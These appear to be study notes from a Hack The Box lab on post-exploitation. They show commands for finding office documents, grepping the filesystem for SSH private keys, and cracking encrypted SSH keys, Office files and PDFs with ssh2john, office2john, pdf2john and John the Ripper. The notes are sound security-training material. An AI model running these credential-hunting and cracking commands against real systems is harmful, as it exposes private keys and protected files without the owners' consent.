#### Hunting for Encrypted Files

- https://fileinfo.com/filetypes/encoded

```bash
OathBornX@htb[/htb]$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .xls

File extension:  .xls*

File extension:  .xltx

File extension:  .od*
/home/cry0l1t3/Docs/document-temp.odt
/home/cry0l1t3/Docs/product-improvements.odp
/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
```

#### Hunting for SSH keys

Certain files, such as `SSH keys`, do not have standard `file extension`. In cases like these, it may be possible to identify files by standard content such as header and footer values. For example, `SSH private keys` always begin with `-----BEGIN [...SNIP...] PRIVATE KEY-----`. We can use tools like `grep` to recursively search the file system for them during post-exploitation.

```bash
OathBornX@htb[/htb]$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----
/home/jsmith/Documents/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

Some `SSH keys` are `encrypted` with a passphrase. With older `PEM formats`, it was possible to tell if an `SSH key` is encrypted based on the header, which contains the `encryption` method in use. Modern `SSH keys`, however, appear the same whether encrypted or not.

```bash
OathBornX@htb[/htb]$ cat /home/jsmith/.ssh/SSH.private

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC

8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
<SNIP>
```

One way to tell whether an `SSH key` is encrypted or not, is to try reading the key with `ssh-keygen`.

```bash
OathBornX@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_ed25519 

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+22Zh59Gzmmtzo6rAffCx2UtaS6
```

As shown below, attempting to read a `password-protected SSH key` will prompt the user for a passphrase:

```bash
OathBornX@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_rsa

Enter passphrase for "/home/jsmith/.ssh/id_rsa":
```
## Cracking encrypted SSH keys

```bash
OathBornX@htb[/htb]$ locate *2john*

/usr/bin/bitlocker2john
/usr/bin/dmg2john
/usr/bin/gpg2john
/usr/bin/hccap2john
/usr/bin/keepass2john
<SNIP>

```

For example, we could use the Python script `ssh2john.py` to acquire the corresponding hash for an encrypted SSH key, and then use `JtR` to try and crack it.

```bash
OathBornX@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
OathBornX@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
1234         (SSH.private)
1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
Session completed
```

We can then view the resulting hash:

```bash
OathBornX@htb[/htb]$ john ssh.hash --show

SSH.private:1234

1 password hash cracked, 0 left
```

---

## Cracking password-protected documents

Today, most `reports, documentation, and information` sheets are commonly distributed as `Microsoft Office` documents or `PDFs`.

```bash
OathBornX@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
OathBornX@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
OathBornX@htb[/htb]$ john protected-docx.hash --show

Protected.docx:1234

1 password hash cracked, 0 left
```

The process for cracking `PDF` files is quite similar, as we simply swap out `office2john.py` for `pdf2john.py`.

```bash
OathBornX@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
OathBornX@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
OathBornX@htb[/htb]$ john pdf.hash --show

PDF.pdf:1234

1 password hash cracked, 0 left
```






